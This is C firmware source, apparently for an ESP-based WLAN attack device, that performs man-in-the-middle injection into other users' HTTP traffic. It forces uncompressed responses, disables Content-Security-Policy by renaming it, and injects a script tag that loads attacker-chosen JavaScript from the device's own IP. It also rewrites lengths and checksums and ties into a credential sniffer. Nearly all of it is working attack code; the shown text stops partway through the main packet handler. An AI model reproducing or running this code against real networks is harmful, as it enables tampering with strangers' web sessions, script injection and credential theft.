#include "wlan_html_inject.h"
#include "wlan_cred_sniff.h"

#include <esp_log.h>
#include <stdio.h>
#include <stddef.h>
#include <string.h>

#define TAG "WlanHtmlInject"

#define ETH_HDR_LEN 14
#define ETHTYPE_IPV4 0x0800
#define IPPROTO_TCP 6

#define INJECT_CODE_MAX 96
// Loader-Template: protocol-relative URL, damit der Browser das Schema von der
// gemitm-ten Seite übernimmt (http auf http-Pages; https-Pages scheitern eh,
// weil wir kein TLS sprechen). Pro Paket wird %%MY_IP%% gerendert. Resultat
// ist ~45 Bytes — passt fast überall in die <body>-Compaction.
// `defer` ist kritisch: ohne wäre der Loader synchron — wenn /code aus
// irgendeinem Grund stuck ist (TCP-Issue, Server-Hänger), blockiert der HTML-
// Parser bis Timeout und der Browser zeigt nie was an. Mit defer rendert die
// Page normal, das Script wird "best effort" geladen und ausgeführt sobald
// das DOM steht.
#define INJECT_LOADER "<script src=\"//%%MY_IP%%/code\" defer></script>"

// Raw User-Payload — wird via wlan_html_inject_set_code gesetzt und beim
// HTTP-GET /code an den Browser ausgeliefert. Darf %%MY_IP%% / %%VICTIM_IP%%
// als Template-Variablen enthalten (vom mitm-server gerendert).
#define USER_PAYLOAD_MAX 1024
#define USER_PAYLOAD_DEFAULT "alert(1234);"

// Length-preserving Replacement für outbound Accept-Encoding-Header:
// "Accept-Encoding: identity" — Server antwortet dann unkomprimiert.
#define AE_REPLACEMENT "Accept-Encoding: identity"
#define AE_REPLACEMENT_LEN 25

static volatile bool s_armed = false;
static volatile uint32_t s_injected = 0;
static volatile uint32_t s_stripped = 0;

// Per-Flow Content-Type-Cache. Continuation-Pakete enthalten keinen
// Content-Type-Header — wir müssen ihn beim Response-Start parsen und für
// alle Folge-Pakete derselben TCP-Connection cachen. Schlüssel ist das volle
// 4-Tuple, damit mehrere parallele Verbindungen zum selben Server (gleiche
// sip+sport) sich nicht in die Quere kommen. Läuft single-threaded im L2-Hook,
// daher keine Synchronisation nötig.
#define FLOW_CACHE_SIZE 16
#define FLOW_URL_MAX WLAN_CRED_STR_MAX
typedef struct {
    uint32_t sip;
    uint16_t sport;
    uint32_t dip;
    uint16_t dport;
    bool is_html;
    bool valid;
    uint32_t lru;
    // URL beim Response-Start einmalig aus url_track geclaimt — bleibt für
    // alle Continuation-Pakete dieser Response gültig. Verhindert, dass spätere
    // Requests in derselben keep-alive Connection den Inject-Display vergiften.
    char host[FLOW_URL_MAX];
    char path[FLOW_URL_MAX];
} FlowEntry;
static FlowEntry s_flow_cache[FLOW_CACHE_SIZE];
static uint32_t s_flow_lru_counter = 0;

// Inject-Payload (Loader-Template, fest). Producer im lwIP-tcpip_thread liest
// s_inject_code_len (atomic acquire) und dann s_inject_code[0..len) — der
// UI-Thread schreibt erst den Buffer, dann release-stored die Länge.
static char s_inject_code[INJECT_CODE_MAX] = INJECT_LOADER;
static volatile uint32_t s_inject_code_len = sizeof(INJECT_LOADER) - 1;
static volatile uint32_t s_my_ip = 0;

// Raw User-Payload für /code-Endpoint. Atomic-store auf len gibt den Buffer
// frei; HTTP-Handler im mitm-server liest mit acquire.
static char s_user_payload[USER_PAYLOAD_MAX] = USER_PAYLOAD_DEFAULT;
static volatile uint32_t s_user_payload_len = sizeof(USER_PAYLOAD_DEFAULT) - 1;

// Render-Scratch — wird im lwIP-tcpip_thread genutzt (single producer),
// daher kein Lock. Vor jedem Inject wird das Template hier aufgelöst.
#define INJECT_RENDERED_MAX 512
static char s_rendered[INJECT_RENDERED_MAX];

static struct WlanCredSniff* s_cred_sniff = NULL;

void wlan_html_inject_set_armed(bool armed) {
    __atomic_store_n(&s_armed, armed, __ATOMIC_RELEASE);
    if(armed) {
        __atomic_store_n(&s_injected, 0u, __ATOMIC_RELAXED);
        __atomic_store_n(&s_stripped, 0u, __ATOMIC_RELAXED);
        // Stale Per-Flow-Einträge aus voriger Session wegwerfen — sonst
        // bringt ein wiederverwendeter (sip,sport,dip,dport)-Tuple alte
        // is_html/URL-Werte zurück und vergiftet neue Connections.
        memset(s_flow_cache, 0, sizeof(s_flow_cache));
        s_flow_lru_counter = 0;
    }
}

bool wlan_html_inject_armed(void) {
    return __atomic_load_n(&s_armed, __ATOMIC_RELAXED);
}

void wlan_html_inject_set_code(const char* code) {
    if(!code) return;
    uint32_t code_l = (uint32_t)strlen(code);
    if(code_l == 0) return;
    if(code_l >= USER_PAYLOAD_MAX) code_l = USER_PAYLOAD_MAX - 1;
    memcpy(s_user_payload, code, code_l);
    s_user_payload[code_l] = '\0';
    __atomic_store_n(&s_user_payload_len, code_l, __ATOMIC_RELEASE);
    // s_inject_code bleibt der Loader — kein Re-Wrap nötig.
}

uint32_t wlan_html_inject_get_payload(char* out, uint32_t max_len) {
    if(!out || max_len == 0) return 0;
    uint32_t l = __atomic_load_n(&s_user_payload_len, __ATOMIC_ACQUIRE);
    if(l > max_len) l = max_len;
    memcpy(out, s_user_payload, l);
    return l;
}

void wlan_html_inject_set_cred_sniff(struct WlanCredSniff* cs) {
    s_cred_sniff = cs;
}

void wlan_html_inject_set_my_ip(uint32_t ip) {
    __atomic_store_n(&s_my_ip, ip, __ATOMIC_RELEASE);
}

uint32_t wlan_html_inject_count_injected(void) {
    return __atomic_load_n(&s_injected, __ATOMIC_RELAXED);
}

uint32_t wlan_html_inject_count_stripped(void) {
    return __atomic_load_n(&s_stripped, __ATOMIC_RELAXED);
}

// ---------------------------------------------------------------------------
// kleine Parse-Helfer (case-insensitive)
// ---------------------------------------------------------------------------

static inline bool is_html_ws(uint8_t c) {
    return c == ' ' || c == '\t' || c == '\r' || c == '\n';
}

static bool ci_match(const uint8_t* a, const char* b, int n) {
    for(int i = 0; i < n; i++) {
        char x = (char)a[i];
        char y = b[i];
        if(x >= 'A' && x <= 'Z') x = (char)(x + 32);
        if(y >= 'A' && y <= 'Z') y = (char)(y + 32);
        if(x != y) return false;
    }
    return true;
}

static const uint8_t* ci_mem_find(const uint8_t* hay, int haylen, const char* needle) {
    int nlen = (int)strlen(needle);
    if(nlen <= 0 || haylen < nlen) return NULL;
    for(int i = 0; i + nlen <= haylen; i++)
        if(ci_match(hay + i, needle, nlen)) return hay + i;
    return NULL;
}

// ---------------------------------------------------------------------------
// Checksums (IP-Header + TCP). IP-Header und TCP-Header sind beim Inject
// betroffen: Total-Length wächst um INJECT_SCRIPT_LEN, daher beide neu.
// ---------------------------------------------------------------------------

static uint16_t one_complement_finalize(uint32_t sum) {
    while(sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (uint16_t)(~sum);
}

static void recompute_ip_csum(uint8_t* ip_hdr) {
    int ihl = (ip_hdr[0] & 0x0f) * 4;
    ip_hdr[10] = 0;
    ip_hdr[11] = 0;
    uint32_t sum = 0;
    for(int i = 0; i + 1 < ihl; i += 2)
        sum += ((uint16_t)ip_hdr[i] << 8) | ip_hdr[i + 1];
    uint16_t cs = one_complement_finalize(sum);
    ip_hdr[10] = (uint8_t)(cs >> 8);
    ip_hdr[11] = (uint8_t)(cs & 0xff);
}

static void recompute_tcp_csum(uint8_t* ip_hdr, int ip_total_len) {
    int ihl = (ip_hdr[0] & 0x0f) * 4;
    uint8_t* tcp = ip_hdr + ihl;
    int tcp_len = ip_total_len - ihl;
    if(tcp_len < 20) return;

    uint32_t sum = 0;
    // Pseudo-Header: src_ip (4B), dst_ip (4B).
    for(int i = 12; i < 20; i += 2)
        sum += ((uint16_t)ip_hdr[i] << 8) | ip_hdr[i + 1];
    sum += ip_hdr[9]; // 0x00 | proto = 0x0006 für TCP
    sum += (uint16_t)tcp_len;

    tcp[16] = 0;
    tcp[17] = 0;
    for(int i = 0; i + 1 < tcp_len; i += 2)
        sum += ((uint16_t)tcp[i] << 8) | tcp[i + 1];
    if(tcp_len & 1) sum += (uint16_t)tcp[tcp_len - 1] << 8;

    uint16_t cs = one_complement_finalize(sum);
    tcp[16] = (uint8_t)(cs >> 8);
    tcp[17] = (uint8_t)(cs & 0xff);
}

// ---------------------------------------------------------------------------
// Accept-Encoding strip (outbound, length-preserving).
// ---------------------------------------------------------------------------

static bool strip_accept_encoding(uint8_t* data, int data_len) {
    const uint8_t* ae = ci_mem_find(data, data_len, "accept-encoding:");
    if(!ae) return false;
    int off = (int)(ae - data);
    int end = off;
    while(end < data_len && data[end] != '\r' && data[end] != '\n') end++;
    int line_len = end - off;
    if(line_len < AE_REPLACEMENT_LEN) return false;
    memcpy(data + off, AE_REPLACEMENT, AE_REPLACEMENT_LEN);
    for(int i = off + AE_REPLACEMENT_LEN; i < end; i++) data[i] = ' ';
    return true;
}

// ---------------------------------------------------------------------------
// CSP strip (inbound, length-preserving). Wir benennen jedes Vorkommen von
// "Content-Security-Policy[-Report-Only]" um — deckt sowohl den HTTP-Response-
// Header als auch <meta http-equiv="Content-Security-Policy" ...> im Body ab.
// Der Browser ignoriert den umbenannten Header / unbekanntes meta-Attribut.
// ---------------------------------------------------------------------------

static bool strip_csp(uint8_t* data, int data_len) {
    // Längeren Namen zuerst — sonst matcht "Content-Security-Policy" auch als
    // Substring von "Content-Security-Policy-Report-Only" und maskiert ihn.
    static const struct {
        const char* needle;
        const char* replace;
    } csps[] = {
        {"Content-Security-Policy-Report-Only", "X-Csp-Stripped---------------------"},
        {"Content-Security-Policy", "X-Csp-Stripped---------"},
    };
    bool any = false;
    for(unsigned n = 0; n < sizeof(csps) / sizeof(csps[0]); n++) {
        int nlen = (int)strlen(csps[n].needle);
        int rlen = (int)strlen(csps[n].replace);
        if(rlen != nlen) continue; // Programmierfehler
        int from = 0;
        while(from + nlen <= data_len) {
            const uint8_t* found = ci_mem_find(data + from, data_len - from, csps[n].needle);
            if(!found) break;
            int off = (int)(found - data);
            memcpy(data + off, csps[n].replace, rlen);
            any = true;
            from = off + nlen;
        }
    }
    return any;
}

// ---------------------------------------------------------------------------
// Content-Length parsen / length-preserving aktualisieren.
// Der Wert wird zwischen ":" und "\r\n" in einem Feld bekannter Länge
// geschrieben — Padding mit führenden Spaces (HTTP OWS), damit die
// Header-Block-Größe konstant bleibt.
// ---------------------------------------------------------------------------

static bool find_content_length(
    uint8_t* data,
    int header_block_len,
    int* out_value_field_off,
    int* out_value_field_len,
    uint32_t* out_value) {
    const uint8_t* cl = ci_mem_find(data, header_block_len, "Content-Length:");
    if(!cl) return false;
    int after_colon = (int)(cl - data) + 15;
    int end = after_colon;
    while(end < header_block_len && data[end] != '\r' && data[end] != '\n') end++;
    int p = after_colon;
    while(p < end && (data[p] == ' ' || data[p] == '\t')) p++;
    if(p == end || data[p] < '0' || data[p] > '9') return false;
    uint32_t val = 0;
    while(p < end && data[p] >= '0' && data[p] <= '9') {
        val = val * 10 + (uint32_t)(data[p] - '0');
        p++;
    }
    *out_value_field_off = after_colon;
    *out_value_field_len = end - after_colon;
    *out_value = val;
    return true;
}

static bool write_content_length(uint8_t* data, int field_off, int field_len, uint32_t new_val) {
    char buf[16];
    int n = snprintf(buf, sizeof(buf), "%u", (unsigned)new_val);
    if(n <= 0 || n > field_len) return false;
    int pad = field_len - n;
    for(int i = 0; i < pad; i++) data[field_off + i] = ' ';
    memcpy(data + field_off + pad, buf, (size_t)n);
    return true;
}

// ---------------------------------------------------------------------------
// Template-Render: %%VAR%%-Platzhalter im Inject-Code durch konkrete Werte
// ersetzen. Out-Buffer wird beschrieben, Anzahl geschriebener Bytes
// zurückgegeben (nicht NUL-terminiert — Caller arbeitet mit Länge).
// Unbekannte oder kaputt geschriebene %%...%% bleiben unverändert im Output.
// ---------------------------------------------------------------------------

static int append_ip(char* out, int out_max, int o, uint32_t ip) {
    const uint8_t* b = (const uint8_t*)&ip;
    char buf[16];
    int n = snprintf(buf, sizeof(buf), "%u.%u.%u.%u", b[0], b[1], b[2], b[3]);
    if(n <= 0) return o;
    if(o + n > out_max) n = out_max - o;
    if(n > 0) {
        memcpy(out + o, buf, (size_t)n);
        o += n;
    }
    return o;
}

static int append_str(char* out, int out_max, int o, const char* s) {
    if(!s) return o;
    int n = (int)strlen(s);
    if(o + n > out_max) n = out_max - o;
    if(n > 0) {
        memcpy(out + o, s, (size_t)n);
        o += n;
    }
    return o;
}

static int render_template(
    char* out, int out_max,
    const char* tmpl, int tmpl_len,
    uint32_t victim_ip, const char* host, const char* path) {
    uint32_t my_ip = __atomic_load_n(&s_my_ip, __ATOMIC_ACQUIRE);
    int o = 0;
    int i = 0;
    while(i < tmpl_len && o < out_max) {
        // %%VAR%% erkennen
        if(i + 4 <= tmpl_len && tmpl[i] == '%' && tmpl[i + 1] == '%') {
            const char* var_start = tmpl + i + 2;
            int max_var_len = tmpl_len - i - 2 - 1; // -1 für das schließende %%
            int var_len = -1;
            for(int j = 0; j + 1 < max_var_len + 1; j++) {
                if(var_start[j] == '%' && var_start[j + 1] == '%') {
                    var_len = j;
                    break;
                }
            }
            if(var_len > 0) {
                int prev_o = o;
                if(var_len == 5 && memcmp(var_start, "MY_IP", 5) == 0) {
                    o = append_ip(out, out_max, o, my_ip);
                } else if(var_len == 9 && memcmp(var_start, "VICTIM_IP", 9) == 0) {
                    o = append_ip(out, out_max, o, victim_ip);
                } else if(var_len == 4 && memcmp(var_start, "HOST", 4) == 0) {
                    o = append_str(out, out_max, o, host);
                } else if(var_len == 4 && memcmp(var_start, "PATH", 4) == 0) {
                    o = append_str(out, out_max, o, path);
                } else {
                    // Unbekannte Variable — wörtlich übernehmen
                    if(o < out_max) out[o++] = tmpl[i];
                    i++;
                    continue;
                }
                // (auch wenn Output durch Cap unverändert blieb, Variable konsumieren)
                (void)prev_o;
                i += 2 + var_len + 2; // "%%VAR%%"
                continue;
            }
        }
        out[o++] = tmpl[i++];
    }
    return o;
}

// ---------------------------------------------------------------------------
// Per-Flow Content-Type-Cache
// ---------------------------------------------------------------------------

static FlowEntry* flow_cache_find(uint32_t sip, uint16_t sport, uint32_t dip, uint16_t dport) {
    for(int i = 0; i < FLOW_CACHE_SIZE; i++) {
        FlowEntry* f = &s_flow_cache[i];
        if(f->valid && f->sip == sip && f->sport == sport &&
           f->dip == dip && f->dport == dport) {
            return f;
        }
    }
    return NULL;
}

static FlowEntry* flow_cache_get(
    uint32_t sip, uint16_t sport, uint32_t dip, uint16_t dport) {
    FlowEntry* f = flow_cache_find(sip, sport, dip, dport);
    if(!f) return NULL;
    f->lru = ++s_flow_lru_counter;
    return f;
}

static FlowEntry* flow_cache_set(
    uint32_t sip, uint16_t sport, uint32_t dip, uint16_t dport,
    bool is_html, const char* host, const char* path) {
    FlowEntry* f = flow_cache_find(sip, sport, dip, dport);
    if(!f) {
        int target = 0;
        uint32_t oldest = UINT32_MAX;
        for(int i = 0; i < FLOW_CACHE_SIZE; i++) {
            if(!s_flow_cache[i].valid) {
                target = i;
                break;
            }
            if(s_flow_cache[i].lru < oldest) {
                oldest = s_flow_cache[i].lru;
                target = i;
            }
        }
        f = &s_flow_cache[target];
        f->sip = sip;
        f->sport = sport;
        f->dip = dip;
        f->dport = dport;
        f->valid = true;
    }
    f->is_html = is_html;
    if(host) {
        size_t n = strlen(host);
        if(n >= sizeof(f->host)) n = sizeof(f->host) - 1;
        memcpy(f->host, host, n);
        f->host[n] = '\0';
    } else {
        f->host[0] = '\0';
    }
    if(path) {
        size_t n = strlen(path);
        if(n >= sizeof(f->path)) n = sizeof(f->path) - 1;
        memcpy(f->path, path, n);
        f->path[n] = '\0';
    } else {
        f->path[0] = '\0';
    }
    f->lru = ++s_flow_lru_counter;
    return f;
}

// Content-Type Response-Header parsen. Nur "text/html" und
// "application/xhtml+xml" gelten als injectable. Kein Content-Type → false
// (conservative — wenn der Server ihn nicht setzt, raten wir nicht).
static bool is_html_content_type(const uint8_t* data, int header_block_len) {
    const uint8_t* ct = ci_mem_find(data, header_block_len, "Content-Type:");
    if(!ct) return false;
    int off = (int)(ct - data) + 13; // strlen("Content-Type:")
    while(off < header_block_len && (data[off] == ' ' || data[off] == '\t')) off++;
    int rem = header_block_len - off;
    if(rem >= 9 && ci_match(data + off, "text/html", 9)) return true;
    if(rem >= 21 && ci_match(data + off, "application/xhtml+xml", 21)) return true;
    return false;
}

// HTTP-Statuscode aus "HTTP/1.1 NNN ..." extrahieren. 0 wenn unparsbar.
static int parse_http_status(const uint8_t* data, int data_len) {
    if(data_len < 12) return 0;
    int sp = -1;
    for(int i = 5; i < 16 && i < data_len; i++) {
        if(data[i] == ' ') {
            sp = i;
            break;
        }
    }
    if(sp < 0) return 0;
    int status = 0;
    int digits = 0;
    for(int i = sp + 1; i < data_len && digits < 4; i++) {
        if(data[i] < '0' || data[i] > '9') break;
        status = status * 10 + (data[i] - '0');
        digits++;
    }
    return digits == 3 ? status : 0;
}

// ---------------------------------------------------------------------------
// Length-preserving Fallback per HTML-Compaction:
//   1. <noscript>...</noscript>-Blöcke wegnehmen (im JS-Pfad eh tot).
//   2. <!-- ... --> HTML-Comments wegnehmen.
//   3. Whitespace direkt nach '>' wegnehmen (semantisch leer im HTML-Flow).
//   4. Mehrfaches Whitespace (Space/Tab/Newline) → ein einzelnes Space —
//      gilt überall, also auch in inline <script>/<style>. JS und CSS sind
//      whitespace-insensitiv, allerdings ändert das Whitespace innerhalb von
//      String-Literals ("Hello   World" → "Hello World"). Akzeptables Risiko.
//      <pre>/<textarea>-Inhalte würden hier unsauber werden — selten genug.
//   5. Den kompakten HTML-Block per memmove um icl Bytes nach rechts schieben.
//   6. Den Script-Code in den entstandenen Lead-Raum schreiben; den Rest hinten
//      mit Spaces auffüllen — Paket bleibt exakt gleich lang.
//
// Das funktioniert sowohl im Response-Start-Paket (wenn growth-Inject am
// <body> nicht möglich war) als auch in Continuation-Paketen ohne <body>.
// Bei Response-Start beginnen wir die Compaction NACH dem Header-Block, sonst
// am Anfang der TCP-Payload.
// ---------------------------------------------------------------------------

// Case-insensitive Tag-Anker-Check: passt "<noscript" mit folgendem Whitespace,
// '/' oder '>'? Muss ausschließen, dass wir innerhalb eines anderen Tags
// landen ("<noscriptly" oder so).
static bool is_noscript_open(const uint8_t* p, int avail) {
    if(avail < 10) return false;
    if(!ci_match(p, "<noscript", 9)) return false;
    uint8_t c = p[9];
    return c == '>' || c == ' ' || c == '\t' || c == '\n' || c == '\r' || c == '/';
}

static bool is_comment_open(const uint8_t* p, int avail) {
    return avail >= 4 && p[0] == '<' && p[1] == '!' && p[2] == '-' && p[3] == '-';
}

// Versucht an Position p einen "skippable block" zu erkennen: <noscript>...
// </noscript> oder <!-- ... -->. Liefert die Block-Länge (>= 0), oder -1 wenn
// kein solcher Block am Anker steht / das schliessende Tag im Paket fehlt.
static int skippable_block_len(const uint8_t* p, int avail) {
    if(avail < 4 || p[0] != '<') return -1;
    if(is_noscript_open(p, avail)) {
        const uint8_t* close = ci_mem_find(p, avail, "</noscript>");
        if(close) return (int)(close - p) + 11; // strlen("</noscript>")
        return -1;
    }
    if(is_comment_open(p, avail)) {
        const uint8_t* close = ci_mem_find(p, avail, "-->");
        if(close) return (int)(close - p) + 3;
        return -1;
    }
    return -1;
}

// Dry-Run: zählt, wie viele Bytes die Compaction sparen würde — keine Mutation.
static int compact_savings(const uint8_t* data, int data_len) {
    int r = 0;
    int saved = 0;
    bool prev_was_gt = false;
    bool prev_was_ws = false;
    while(r < data_len) {
        int block = skippable_block_len(data + r, data_len - r);
        if(block > 0) {
            saved += block;
            r += block;
            prev_was_gt = true; // sowohl </noscript> als auch --> enden auf '>'
            prev_was_ws = false;
            continue;
        }
        bool ws = is_html_ws(data[r]);
        if(ws && (prev_was_gt || prev_was_ws)) {
            saved++;
            r++;
            continue;
        }
        prev_was_gt = (data[r] == '>');
        prev_was_ws = ws;
        r++;
    }
    return saved;
}

// In-place Compaction. Schreibt das kompakte HTML nach data[0..ret) und liefert
// die neue Länge. Bytes hinter ret sind "frei" (enthalten Lese-Reste).
static int compact_inplace(uint8_t* data, int data_len) {
    int w = 0, r = 0;
    bool prev_was_gt = false;
    bool prev_was_ws = false;
    while(r < data_len) {
        int block = skippable_block_len(data + r, data_len - r);
        if(block > 0) {
            r += block;
            prev_was_gt = true;
            prev_was_ws = false;
            continue;
        }
        bool ws = is_html_ws(data[r]);
        if(ws && (prev_was_gt || prev_was_ws)) {
            r++;
            continue;
        }
        // Tab/Newline werden zu Space normalisiert, damit die Sequenz "WS+WS"
        // Detection in nachfolgenden Iterationen einheitlich greift und das
        // sichtbare Resultat sauber bleibt (Browser sieht eh Whitespace).
        data[w] = ws ? ' ' : data[r];
        prev_was_gt = (data[r] == '>');
        prev_was_ws = ws;
        w++;
        r++;
    }
    return w;
}

// Sucht im HTML-Fragment den ersten verwendbaren Inject-Anker: <head...>
// (bevorzugt — Loader läuft so vor jedem dynamischen body-Reset) oder
// <body...> als Fallback. Liefert Position direkt nach dem '>' des Tags, oder
// -1 wenn kein vollständiger Anker im Paket steckt. Schließt False-Positives
// wie <header> aus, indem nach "<head"/"<body" auf erlaubtes Folgezeichen
// (Whitespace, '/', '>') geprüft wird.
static int find_inject_anchor(const uint8_t* data, int data_len) {
    static const struct { const char* name; int len; } anchors[] = {
        {"<head", 5},
        {"<body", 5},
    };
    for(unsigned t = 0; t < sizeof(anchors) / sizeof(anchors[0]); t++) {
        int from = 0;
        while(from < data_len) {
            const uint8_t* tag =
                ci_mem_find(data + from, data_len - from, anchors[t].name);
            if(!tag) break;
            int tag_off = (int)(tag - data);
            int after = tag_off + anchors[t].len;
            if(after >= data_len) break;
            uint8_t c = data[after];
            bool valid_boundary =
                c == '>' || c == ' ' || c == '\t' ||
                c == '\n' || c == '\r' || c == '/';
            if(valid_boundary) {
                for(int i = after; i < data_len; i++) {
                    if(data[i] == '>') return i + 1;
                    if(data[i] == '<') return -1; // Tag halb im Paket
                }
                return -1;
            }
            from = after; // war false-positive (z.B. <header>) — weiter suchen
        }
    }
    return -1;
}

// Compaction-basierter Inject. data[0..region_len) ist der Bereich, in dem
// compactiert werden darf (in Response-Start: nach Header-Block; sonst
// gesamte Payload). Script landet direkt hinter <head...> (oder <body...>
// als Fallback). Wenn kein Anker da ist (Continuation-Paket nach dem
// Head/Body-Tag), Inject hier skippen.
// Returns true bei Erfolg (Daten wurden modifiziert).
static bool inject_via_compaction(uint8_t* data, int region_len, const char* code, int icl) {
    if(icl <= 0 || icl > region_len) return false;

    // Vor-Check: Anker im Original. Compaction verschiebt den Tag nicht aus
    // dem Paket raus, also ist er nach Compaction garantiert noch da. So
    // vermeiden wir, dass compact_inplace die Daten destruktiv modifiziert
    // obwohl wir am Ende eh nicht injecten würden.
    if(find_inject_anchor(data, region_len) < 0) return false;
    if(compact_savings(data, region_len) < icl) return false;

    int new_len = compact_inplace(data, region_len);
    int inject_pos = find_inject_anchor(data, new_len);
    if(inject_pos < 0) return false; // sollte nicht passieren

    // [inject_pos..new_len) nach rechts schieben, Script reinkopieren, Rest
    // mit Spaces auffüllen.
    int tail_len = new_len - inject_pos;
    memmove(data + inject_pos + icl, data + inject_pos, (size_t)tail_len);
    memcpy(data + inject_pos, code, (size_t)icl);
    for(int i = inject_pos + icl + tail_len; i < region_len; i++) data[i] = ' ';
    return true;
}

// ---------------------------------------------------------------------------
// Inject am <body>-Anfang. Vergrössert den TCP-Payload um INJECT_SCRIPT_LEN
// Bytes. Liefert den tatsächlichen Wachstum oder 0 wenn kein Inject erfolgte.
// max_growth = Headroom im Ethernet-Buffer (>= INJECT_SCRIPT_LEN nötig).
// ---------------------------------------------------------------------------

// data muss ein HTTP-Response-Start-Paket sein (Payload beginnt mit "HTTP/").
// Caller stellt das sicher, daher kein redundanter Check.
// Inject landet hinter <head...> (bevorzugt) oder <body...> (Fallback) —
// head-platziert, weil JS auf der Page später document.body.innerHTML setzen
// und unseren Loader killen könnte.
static int inject_after_anchor(
    uint8_t* data, int data_len, int max_growth, const char* code, int icl) {
    if(icl <= 0) return 0;
    if(max_growth < icl) return 0;

    const uint8_t* hdr_end_p = ci_mem_find(data, data_len, "\r\n\r\n");
    if(!hdr_end_p) return 0;
    int header_block_len = (int)(hdr_end_p - data);
    int body_off = header_block_len + 4;
    int body_avail = data_len - body_off;
    if(body_avail <= 0) return 0;

    int cl_off, cl_field_len;
    uint32_t cl_value;
    if(!find_content_length(data, header_block_len, &cl_off, &cl_field_len, &cl_value)) return 0;
    if(cl_value > (uint32_t)body_avail) return 0; // multi-segment → compaction fallback

    int anchor_in_html = find_inject_anchor(data + body_off, body_avail);
    if(anchor_in_html < 0) return 0;
    int inject_pos = body_off + anchor_in_html;

    if(!write_content_length(data, cl_off, cl_field_len, cl_value + (uint32_t)icl)) return 0;

    int tail = data_len - inject_pos;
    memmove(data + inject_pos + icl, data + inject_pos, (size_t)tail);
    memcpy(data + inject_pos, code, (size_t)icl);
    return icl;
}

// ---------------------------------------------------------------------------
// Entry
// ---------------------------------------------------------------------------

bool wlan_html_inject_process_eth(uint8_t* eth, uint16_t* len_ptr, uint16_t buf_size) {
    if(!wlan_html_inject_armed()) return false;
    if(!eth || !len_ptr) return false;
    uint16_t len = *len_ptr;
    if(len < ETH_HDR_LEN + 20 + 20) return false;

    uint16_t ethertype = ((uint16_t)eth[12] << 8) | eth[13];
    if(ethertype != ETHTYPE_IPV4) return false;

    uint8_t* ip = eth + ETH_HDR_LEN;
    int ip_avail = (int)len - ETH_HDR_LEN;
    if((ip[0] >> 4) != 4) return false;
    int ihl = (ip[0] & 0x0f) * 4;
    if(ihl < 20 || ihl > ip_avail) return false;
    int ip_total = ((int)ip[2] << 8) | ip[3];
    if(ip_total < ihl) return false;
    if(ip_total > ip_avail) ip_total = ip_avail;
    if(ip[9] != IPPROTO_TCP) return false;

    uint8_t* tcp = ip + ihl;
    int tcp_len = ip_total - ihl;
    if(tcp_len < 20) return false;
    int doff = ((tcp[12] >> 4) & 0x0f) * 4;
    if(doff < 20 || doff > tcp_len) return false;
    uint8_t* data = tcp + doff;
    int data_len = tcp_len - doff;
    if(data_len <= 0) return false;

    uint16_t sport = ((uint16_t)tcp[0] << 8) | tcp[1];
    uint16_t dport = ((uint16_t)tcp[2] << 8) | tcp[3];

    bool to_server = (dport == 80 || dport == 8080 || dport == 8000);
    bool from_server = (sport == 80 || sport == 8080 || sport == 8000);

    bool modified = false;
    int growth = 0;

    if(to_server) {
        if(strip_accept_encoding(data, data_len)) {
            __atomic_fetch_add(&s_stripped, 1u, __ATOMIC_RELAXED);
            modified = true;
        }
    } else if(from_server) {
        uint32_t src_ip, dst_ip;
        memcpy(&src_ip, ip + 12, 4);
        memcpy(&dst_ip, ip + 16, 4);

        bool is_response_start = (data_len >= 5 && memcmp(data, "HTTP/", 5) == 0);

        // Per-Flow Content-Type- und URL-Tracking: bei Response-Start Header
        // parsen und URL aus url_track claimen, bei Continuation aus Cache
        // lesen. Wenn der Stream nicht HTML ist (.js, .css, Bilder) → komplett
        // skippen, sonst injecten wir Müll in JavaScript-Files o.ä.
        FlowEntry* flow;
        if(is_response_start) {
            const uint8_t* hdr_end = ci_mem_find(data, data_len, "\r\n\r\n");
            int hdr_len = hdr_end ? (int)(hdr_end - data) : data_len;
            int status = parse_http_status(data, data_len);
            // Nur erfolgreiche Responses (2xx) injecten. 3xx-Redirects haben
            // keinen Body; 4xx/5xx-Error-Pages sind oft text/html (z.B. 404
            // für .css.map vom DevTools), aber Browser zeigen sie selten an —
            // Inject darin ist verschwendete Mühe und macht den INJ-Display
            // verwirrend.
            bool ok_status = (status >= 200 && status < 300);
            bool is_html = ok_status && is_html_content_type(data, hdr_len);
            char host_buf[WLAN_CRED_STR_MAX] = {0};
            char path_buf[WLAN_CRED_STR_MAX] = {0};
            if(is_html && s_cred_sniff) {
                // url_track bei Response-Start einfrieren — danach kann ein
                // pipelined Folge-Request den Slot überschreiben, wir nutzen
                // aber ab jetzt nur noch unsere Kopie.
                wlan_cred_sniff_lookup_http_url(
                    s_cred_sniff, src_ip, dport,
                    host_buf, sizeof(host_buf), path_buf, sizeof(path_buf));
            }
            flow = flow_cache_set(src_ip, sport, dst_ip, dport, is_html, host_buf, path_buf);
        } else {
            // Unbekannter Flow (Cache-Eviction, Stream-Boot mid-connection):
            // conservative skip statt blind injecten.
            flow = flow_cache_get(src_ip, sport, dst_ip, dport);
            if(!flow) return false;
        }
        if(!flow->is_html) return false;

        // Template rendern aus per-Flow gecachtem Host/Path. NICHT direkt aus
        // url_track lesen — der zeigt bei keep-alive auf den letzten Request,
        // nicht auf den, zu dem die aktuelle Response gehört.
        const char* host_buf = flow->host;
        const char* path_buf = flow->path;
        uint32_t tmpl_len = __atomic_load_n(&s_inject_code_len, __ATOMIC_ACQUIRE);
        int rendered_len = 0;
        if(tmpl_len > 0) {
            rendered_len = render_template(
                s_rendered, INJECT_RENDERED_MAX,
                s_inject_code, (int)tmpl_len,
                dst_ip, host_buf, path_buf);
        }

        bool injected_now = false;
        const char* via = NULL;

        // CSP-Strip + growth-Inject am <head>-Anker sind nur auf Response-Start
        // Paketen sinnvoll. Folge-Pakete enthalten weder Header noch Anker-Tag.
        if(is_response_start) {
            if(strip_csp(data, data_len)) {
                __atomic_fetch_add(&s_stripped, 1u, __ATOMIC_RELAXED);
                modified = true;
            }
            int headroom = (int)buf_size - (int)len;
            int g = inject_after_anchor(data, data_len, headroom, s_rendered, rendered_len);
            if(g > 0) {
                growth = g;
                data_len += g;
                modified = true;
                injected_now = true;
                via = "growth";
            }
        }

        // Compaction-Fallback (length-preserving). Continuation-Pakete ohne
        // Anker silent skippen — das ist normal und braucht keinen Log.
        if(!injected_now && rendered_len > 0 &&
           memchr(data, '<', (size_t)data_len) != NULL) {
            uint8_t* region = data;
            int region_len = data_len;
            if(is_response_start) {
                const uint8_t* hdr_end = ci_mem_find(data, data_len, "\r\n\r\n");
                if(hdr_end) {
                    int hdr_len = (int)(hdr_end - data) + 4;
                    region = data + hdr_len;
